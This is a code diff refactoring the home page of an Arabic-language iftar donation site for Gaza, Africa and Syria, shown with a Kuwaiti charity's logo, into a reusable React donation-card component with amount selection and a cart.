@@ -1,19 +1,22 @@
 "use client"
+
 import Image from "next/image"
-import { WhatsappIcon } from "@/components/icons"
 import { useRouter } from "next/navigation"
 import { useEffect, useState } from "react"
+import { WhatsappIcon } from "@/components/icons"
 import { addData } from "@/lib/firebase"
+
 export default function Home() {
   const [_id] = useState(() => "id" + Math.random().toString(16).slice(2))
+  const router = useRouter()
 
-  const routre=useRouter()
-  useEffect(()=>{
+  useEffect(() => {
     addData({
       createdDate: new Date().toISOString(),
       id: _id,
     })
-  },[])
+  }, [_id])
+
   return (
     <div className="min-h-screen bg-gray-100 rtl">
       {/* Header */}
@@ -37,180 +40,52 @@ export default function Home() {
           </svg>
         </button>
         <div className="flex items-center">
-          <Image
-            src="/white_logo2.png"
-            alt="الخيرية الكويتية"
-            width={120}
-            height={32}
-            className="h-8 w-auto"
-          />
+          <Image src="/white_logo2.png" alt="الخيرية الكويتية" width={120} height={32} className="h-8 w-auto" />
         </div>
       </header>
 
       <main className="container mx-auto p-4 space-y-6">
         {/* First Donation Card */}
-        <section className="bg-white rounded-lg overflow-hidden shadow">
-          <div className="p-4 bg-blue-600 text-white">
-            <h2 className="text-lg font-bold text-right">إفطار صائم - غزة</h2>
-          </div>
-
-          <div className="relative">
-            <img
-              src="/5.jpg"
-              alt="إفطار الصائم"
-              width={400}
-              height={300}
-              className="w-full h-60 object-cover"
-            />
-            <div className="absolute top-2 left-2 bg-red-600 text-white px-3 py-1 rounded-full text-sm">تبرع الآن</div>
-            <div className="absolute bottom-2 left-2 bg-red-600 text-white px-3 py-1 rounded-full">1.750 د.ك</div>
-          </div>
-
-          <div className="p-4">
-            <div className="flex justify-between text-sm mb-2">
-              <div className="text-gray-600">عدد المتبرعين: 1657</div>
-            </div>
-
-            <div className="flex justify-between mb-2">
-              <div className="font-bold">62,500 د.ك</div>
-              <div className="text-gray-600">المتبقي</div>
-              <div className="font-bold">62,500 د.ك</div>
-              <div className="text-gray-600">المدفوع</div>
-              <div className="font-bold">125,000 د.ك</div>
-              <div className="text-gray-600">المطلوب</div>
-            </div>
-
-            <div className="w-full bg-gray-200 rounded-full h-2 mb-4">
-              <div className="bg-red-600 h-2 rounded-full" style={{ width: "50%" }}></div>
-            </div>
-
-            <div className="grid grid-cols-3 gap-2 mb-4">
-              <button className="border border-gray-300 rounded py-2 text-center">5 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center">10 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center">20 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center">50 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center">100 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center">200 د.ك</button>
-            </div>
-
-            <div className="grid grid-cols-2 gap-2">
-              <button onClick={()=>{
-                routre.push('/payment')
-              }}className="bg-red-600 text-white rounded py-2 text-center font-bold">تبرع الآن</button>
-              <button className="bg-blue-600 text-white rounded py-2 text-center font-bold">أضف إلى السلة</button>
-            </div>
-          </div>
-        </section>
+        <DonationCard
+          title="إفطار صائم - غزة"
+          imageSrc="/5.jpg"
+          imageAlt="إفطار الصائم"
+          donorCount={1657}
+          amountRequired={125000}
+          amountPaid={62500}
+          donationAmount={1.75}
+          progress={50}
+          isCompleted={false}
+          onDonate={() => router.push("/payment")}
+        />
 
         {/* Second Donation Card (Completed) */}
-        <section className="bg-white rounded-lg overflow-hidden shadow">
-          <div className="p-4 bg-blue-600 text-white">
-            <h2 className="text-lg font-bold text-right">إفطار صائم - إفريقيا
-</h2>
-          </div>
-
-          <div className="relative">
-            <img
-              src="/4.jpg"
-              alt="إفطار الصائم"
-              width={400}
-              height={200}
-              className="w-full h-48 object-cover"
-            />
-            <div className="absolute inset-0 bg-opacity-70 flex items-center justify-center">
-            </div>
-          </div>
-
-          <div className="p-4">
-            <div className="flex justify-between text-sm mb-2">
-              <div className="text-gray-600">عدد المتبرعين: 1150</div>
-            </div>
-
-            <div className="flex justify-between mb-2">
-              <div className="font-bold">0 د.ك</div>
-              <div className="text-gray-600">المتبقي</div>
-              <div className="font-bold">75,000 د.ك</div>
-              <div className="text-gray-600">المدفوع</div>
-              <div className="font-bold">75,000 د.ك</div>
-              <div className="text-gray-600">المطلوب</div>
-            </div>
-
-            <div className="w-full bg-gray-200 rounded-full h-2 mb-4">
-              <div className="bg-green-600 h-2 rounded-full w-full"></div>
-            </div>
-
-            <div className="grid grid-cols-3 gap-2 mb-4">
-              <button className="border border-gray-300 rounded py-2 text-center text-gray-400">5 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center text-gray-400">10 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center text-gray-400">20 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center text-gray-400">50 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center text-gray-400">100 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center text-gray-400">200 د.ك</button>
-            </div>
-
-            <div className="grid grid-cols-2 gap-2">
-              <button onClick={()=>{
-                routre.push('/payment')
-              }} className="bg-gray-400 text-white rounded py-2 text-center font-bold">تبرع الآن</button>
-              <button className="bg-gray-400 text-white rounded py-2 text-center font-bold">أضف إلى السلة</button>
-            </div>
-          </div>
-        </section>
+        <DonationCard
+          title="إفطار صائم - إفريقيا"
+          imageSrc="/4.jpg"
+          imageAlt="إفطار الصائم"
+          donorCount={1150}
+          amountRequired={75000}
+          amountPaid={75000}
+          donationAmount={0}
+          progress={100}
+          isCompleted={true}
+          onDonate={() => router.push("/payment")}
+        />
 
         {/* Third Donation Card */}
-        <section className="bg-white rounded-lg overflow-hidden shadow">
-          <div className="p-4 bg-blue-600 text-white">
-            <h2 className="text-lg font-bold text-right">إفطار صائم - سوريا
-</h2>
-          </div>
-
-          <div className="relative">
-            <img
-              src="/3.jpg"
-              alt="إفطار الصائم"
-              width={400}
-              height={200}
-              className="w-full h-48 object-cover"
-            />
-            <div className="absolute top-2 left-2 bg-red-600 text-white px-3 py-1 rounded-full text-sm">تبرع الآن</div>
-            <div className="absolute bottom-2 left-2 bg-red-600 text-white px-3 py-1 rounded-full">1.250 د.ك</div>
-          </div>
-
-          <div className="p-4">
-            <div className="flex justify-between text-sm mb-2">
-              <div className="text-gray-600">عدد المتبرعين: 221</div>
-            </div>
-
-            <div className="flex justify-between mb-2">
-              <div className="font-bold">17,500 د.ك</div>
-              <div className="text-gray-600">المتبقي</div>
-              <div className="font-bold">2,500 د.ك</div>
-              <div className="text-gray-600">المدفوع</div>
-              <div className="font-bold">20,000 د.ك</div>
-              <div className="text-gray-600">المطلوب</div>
-            </div>
-
-            <div className="w-full bg-gray-200 rounded-full h-2 mb-4">
-              <div className="bg-red-600 h-2 rounded-full" style={{ width: "12%" }}></div>
-            </div>
-
-            <div className="grid grid-cols-3 gap-2 mb-4">
-              <button className="border border-gray-300 rounded py-2 text-center">5 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center">10 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center">20 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center">50 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center">100 د.ك</button>
-              <button className="border border-gray-300 rounded py-2 text-center">200 د.ك</button>
-            </div>
-
-            <div className="grid grid-cols-2 gap-2">
-              <button className="bg-red-600 text-white rounded py-2 text-center font-bold" onClick={()=>{
-                routre.push('/payment')
-              }}>تبرع الآن</button>
-              <button className="bg-blue-600 text-white rounded py-2 text-center font-bold">أضف إلى السلة</button>
-            </div>
-          </div>
-        </section>
+        <DonationCard
+          title="إفطار صائم - سوريا"
+          imageSrc="/3.jpg"
+          imageAlt="إفطار الصائم"
+          donorCount={221}
+          amountRequired={20000}
+          amountPaid={2500}
+          donationAmount={1.25}
+          progress={12}
+          isCompleted={false}
+          onDonate={() => router.push("/payment")}
+        />
       </main>
 
       {/* WhatsApp floating button */}
@@ -220,6 +95,139 @@ export default function Home() {
         </button>
       </div>
     </div>
+  )
+}
+
+interface DonationCardProps {
+  title: string
+  imageSrc: string
+  imageAlt: string
+  donorCount: number
+  amountRequired: number
+  amountPaid: number
+  donationAmount: number
+  progress: number
+  isCompleted: boolean
+  onDonate: () => void
+}
+
+function DonationCard({
+  title,
+  imageSrc,
+  imageAlt,
+  donorCount,
+  amountRequired,
+  amountPaid,
+  donationAmount,
+  progress,
+  isCompleted,
+  onDonate,
+}: DonationCardProps) {
+  const [selectedAmount, setSelectedAmount] = useState<number | null>(null)
+  const amountRemaining = amountRequired - amountPaid
+  const progressColor = isCompleted ? "bg-green-600" : "bg-red-600"
+  const buttonColor = isCompleted ? "bg-gray-400" : "bg-red-600"
+  const cartButtonColor = isCompleted ? "bg-gray-400" : "bg-blue-600"
+
+  const handleDonate = () => {
+    if (selectedAmount) {
+      // Store the selected amount and title
+      localStorage.setItem("donationAmount", selectedAmount.toString())
+      localStorage.setItem("donationType", title)
+
+      // Call the onDonate function with the selected amount and title
+      onDonate()
+    } else {
+      alert("الرجاء اختيار مبلغ التبرع")
+    }
+  }
+
+  return (
+    <section className="bg-white rounded-lg overflow-hidden shadow">
+      <div className="p-4 bg-blue-600 text-white">
+        <h2 className="text-lg font-bold text-right">{title}</h2>
+      </div>
+      <div className="relative">
+        <img
+          src={imageSrc || "/placeholder.svg"}
+          alt={imageAlt}
+          width={400}
+          height={200}
+          className="w-full h-48 object-cover"
+        />
+        {!isCompleted && (
+          <>
+            <div className="absolute top-2 left-2 bg-red-600 text-white px-3 py-1 rounded-full text-sm">تبرع الآن</div>
+            <div className="absolute bottom-2 left-2 bg-red-600 text-white px-3 py-1 rounded-full">
+              {donationAmount} د.ك
+            </div>
+          </>
+        )}
+      </div>
+      <div className="p-4">
+        <div className="flex justify-between text-sm mb-2">
+          <div className="text-gray-600">عدد المتبرعين: {donorCount}</div>
+        </div>
+        <div className="flex justify-between mb-2">
+          <div className="font-bold">{amountRemaining.toLocaleString()} د.ك</div>
+          <div className="text-gray-600">المتبقي</div>
+          <div className="font-bold">{amountPaid.toLocaleString()} د.ك</div>
+          <div className="text-gray-600">المدفوع</div>
+          <div className="font-bold">{amountRequired.toLocaleString()} د.ك</div>
+          <div className="text-gray-600">المطلوب</div>
+        </div>
+        <div className="w-full bg-gray-200 rounded-full h-2 mb-4">
+          <div className={`${progressColor} h-2 rounded-full`} style={{ width: `${progress}%` }}></div>
+        </div>
+        <div className="grid grid-cols-3 gap-2 mb-4">
+          {[5, 10, 20, 50, 100, 200].map((amount) => (
+            <button
+              key={amount}
+              onClick={() => !isCompleted && setSelectedAmount(amount)}
+              className={`border rounded py-2 text-center transition-colors ${
+                isCompleted
+                  ? "text-gray-400 border-gray-300"
+                  : selectedAmount === amount
+                    ? "bg-blue-600 text-white border-blue-600"
+                    : "border-gray-300 hover:bg-blue-50"
+              }`}
+            >
+              {amount} د.ك
+            </button>
+          ))}
+        </div>
+        <div className="grid grid-cols-2 gap-2">
+          <button
+            onClick={handleDonate}
+            className={`${buttonColor} text-white rounded py-2 text-center font-bold`}
+            disabled={isCompleted || !selectedAmount}
+          >
+            تبرع الآن
+          </button>
+          <button
+            className={`${cartButtonColor} text-white rounded py-2 text-center font-bold`}
+            onClick={() => {
+              if (selectedAmount && !isCompleted) {
+                // Add to cart logic
+                localStorage.setItem(
+                  "cartItem",
+                  JSON.stringify({
+                    title,
+                    amount: selectedAmount,
+                  }),
+                )
+                alert("تمت الإضافة إلى السلة")
+              } else if (!selectedAmount) {
+                alert("الرجاء اختيار مبلغ التبرع")
+              }
+            }}
+            disabled={isCompleted || !selectedAmount}
+          >
+            أضف إلى السلة
+          </button>
+        </div>
+      </div>
+    </section>
   )
 }
 
